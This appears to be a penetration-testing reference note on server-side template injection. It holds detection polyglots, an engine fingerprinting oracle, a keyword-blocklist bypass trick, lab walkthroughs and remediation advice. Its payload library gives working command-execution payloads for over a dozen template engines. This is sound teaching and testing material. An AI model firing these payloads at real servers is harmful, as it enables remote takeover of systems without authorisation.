---
type: technique
title: Server-Side Template Injection (SSTI)
lang: en
status: active
wstg: ["WSTG-INPV-18"]
owasp_top10: ["A03:2021"]
owasp_api: []
asvs: ["V1.3.7"]
cwe: ["CWE-1336", "CWE-94"]
attack: ["T1190"]
cvss: ""
sources: [web-200-oswa, pg-fullmoon, payloadsallthethings, hacktricks]
updated: 2026-09-17
---

# Server-Side Template Injection (SSTI)

**TL;DR** — When user input is concatenated into a template's **source** (not passed as a
data variable), the template engine evaluates attacker expressions server-side. Fingerprint
the engine, then use its language escape to reach **remote code execution**.

> Framework: **A03:2021 – Injection**, `CWE-1336` (template injection) / `CWE-94`, ATT&CK
> `T1190`. WSTG + ASVS IDs in frontmatter (WSTG 4.2 / ASVS 5.0, verified). See [[templating-engines]] for the underlying model.

## Where it applies

Anywhere user input reaches template *source*: customisable email/notification templates,
CMS themes and translations, profile/display-name fields, form fields (form-builder
plugins), and error pages. Contrast with the safe pattern where input is bound as a
context variable.

## How it works

Engines evaluate expressions inside delimiters and interpolate the result. If your input
sits where the engine parses expressions, `{{7*7}}`-style math is evaluated — proof the
input is *code*, not *data*. From there you climb from the template's expression language
into the host language (PHP/Java/Node/Python) and run OS commands.

## Detection & fingerprinting

Submit a polyglot and see which delimiter evaluates:

```
${7*7}  {{7*7}}  #{7*7}  <%= 7*7 %>  ${{7*7}}  {7*7}
```

- `{{49}}` → Twig / Jinja / Handlebars-family. `${49}` → Freemarker / Velocity.
  `#{49}` → Pug.
- **Type-strict engines leak themselves:** multiplying a number by a *string* errors in
  Freemarker and Jinja — a quick way to separate them from lax ones. Combine with
  language guesses (Java app + `${…}` + type error ⇒ Freemarker).

## Exploitation by engine

All commands below use a benign `id`/`whoami` as proof — swap for your PoC only.

**Twig (PHP).** No advertised host access, but filters bridge to PHP:

```twig
{{ ['id'] | filter('system') }}
{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}
```

**Freemarker (Java).** The `Execute` utility:

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

**Pug (Node).** Reach `require` via the global object, then `child_process`:

```pug
- var r = global.process.mainModule.require
= r('child_process').execSync('id')
```

**Jinja (Python).** Walk the object graph to `os`:

```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}   {# enumerate gadgets if cycler is filtered #}
```

**Handlebars / Mustache (Node).** Mustache is logic-less (XSS, not RCE); Handlebars RCE
uses the known constructor/`require` gadget chain via `#with`/`lookup`.

### Other engines & hardened targets

- **Velocity (Java):** reach `Runtime.exec` via reflection (`#set($x=...)`).
- **Smarty (PHP):** `{system('id')}` / `{php}…{/php}` on older versions.
- **ERB (Ruby):** `<%= system('id') %>` (Slim/Haml analogous).
- **EJS (Node):** `<%= 7*7 %>` → `49`; reach `require` through the global process object (same
  `<% %>` tags as ERB — the Node-vs-Ruby language guess disambiguates):

  ```ejs
  <%= global.process.mainModule.require('child_process').execSync('id') %>
  ```
- **Keyword blocklist bypass:** when the app strips banned words (`process`, `require`, `exec`)
  with a single `String.replace(/word/g,'')` pass, **nest the word in itself** so one removal
  reassembles it — `procprocessess` → `process`, `reqrequireuire` → `require`. Also try
  alternate access (`this`, `constructor`, `x['con'+'structor']`).
- **Sandboxes** (Twig `SandboxExtension`, Jinja sandboxed env) block some gadgets — enumerate
  reachable attributes / `__subclasses__` for an escape (many are public per version).
- **Blind SSTI:** no output → use an error/timing oracle (`{{7*'7'}}` vs `{{7*7}}`) or make
  the engine fetch a [[burp-suite|Burp]] Collaborator URL.

## Payload library — detection oracle & more engines

Fuller per-engine set: [[payloadsallthethings|PaTT]] + [[hacktricks]].

**Fingerprint by error → language:** `ZeroDivisionError`→Python · `ArithmeticException`→Java ·
`TypeError`/`ReferenceError`→Node · `DivisionByZeroError`→PHP · `divided by 0`→Ruby ·
`Arithmetic operation failed`→Freemarker. Distinguisher: `{{7*'7'}}` → `49` (Twig/Freemarker)
vs `7777777` (Jinja2/Tornado).

**Jinja2 (Python)** — leak config, then RCE without relying on `__builtins__`:

```python
{{ config.items() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

**Mako / Tornado (Python):**

```python
<%import os%>${os.popen('id').read()}          {# Mako #}
{% import os %}{{ os.system('id') }}            {# Tornado #}
```

**Nunjucks (Node):**

```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

**SpringEL / Thymeleaf / OGNL (Java):**

```java
${T(java.lang.Runtime).getRuntime().exec('id')}
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

**Pebble (Java, ≥3):**

```java
{% set cmd='id' %}{{ (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null).exec(cmd) }}
```

**Razor / classic ASP (.NET):**

```text
@System.Diagnostics.Process.Start("cmd.exe","/c whoami");
<%= CreateObject("Wscript.Shell").exec("cmd /c whoami").StdOut.ReadAll() %>
```

**Go `text/template`:** `{{ . }}` dumps the data object; RCE only if it exposes a method
(`{{ .System "id" }}`). `html/template` auto-escapes XSS but not method-call RCE.

Tools: **SSTImap**, **tplmap**, **TInjA**; the Hackmanit *Template-Injection-Table* (44 engines)
is the best fingerprint oracle.

## Worked examples

From [[web-200-oswa]] (module 12, `template-sandbox` then real apps):

- **Craft CMS + Sprout Forms** — Craft renders **Twig**; a form field handled by the Sprout
  Forms plugin evaluates injected Twig, giving the Twig-filter → `system` RCE path above.
- **Halo** — a **Freemarker**-backed (Java) app; injection reaches a Freemarker-rendered
  field (via the translation/theme path), exploited with the `Execute` utility for RCE.
- **Fullmoon (EJS)** — from [[pg-fullmoon]] (OffSec PG box): a report **Templates** feature
  renders **EJS**; `49 -> <%= 7*7 %>` returns `49 -> 49`, confirming injection. An exported
  `server.js` backup exposes a middleware stripping `process`/`require`/`exec` once — beaten by
  the keyword-nesting above — reaching `child_process` for a reverse shell → `proof.txt`.

Method in all: locate a field that feeds template source → fingerprint the engine →
apply that engine's escape (and beat any keyword filter) → confirm with `id`.

## Confirming impact

`{{7*7}}` → `49` proves injection; a returned `id`/`whoami` proves RCE. Impact is typically
**Critical** (server code execution). Pivot to [[command-injection|reverse shell]] carefully
and only in-scope.

## Remediation

- Never build templates from user input — pass input as **bound data**, not source.
- Prefer logic-less templates; enable the engine **sandbox** (and know sandboxes are often
  bypassable — don't rely on them alone).
- Patch engines/plugins; least-privilege the app process.

## Quick checklist

- [ ] Input reaches template *source* (display-name/theme/email/report template, error page)?
- [ ] Polyglot `${{<%[%'"}}%\` + `{{7*7}}`/`${7*7}`/`<%=7*7%>` → which delimiter renders `49`?
- [ ] `{{7*'7'}}` + the error text → pin the engine/language.
- [ ] Apply that engine's escape to `id`; keyword filter → nest (`procprocessess`); sandbox → gadget-walk `__subclasses__`.
- [ ] Blind → error/timing oracle or Collaborator fetch. Confirm `id` → [[command-injection|reverse shell]].

## See also

[[templating-engines]] · [[command-injection]] · [[xss]] · [[burp-suite]]

*Sources: [[web-200-oswa]] module 12 (Twig/Freemarker/Pug/Jinja/Handlebars; Halo & Craft CMS); [[pg-fullmoon]] (EJS + regex-replace-once keyword-filter bypass); [[payloadsallthethings]] + [[hacktricks]] (error→language oracle, Mako/Tornado/Nunjucks/SpringEL/Pebble/Razor/Go).*
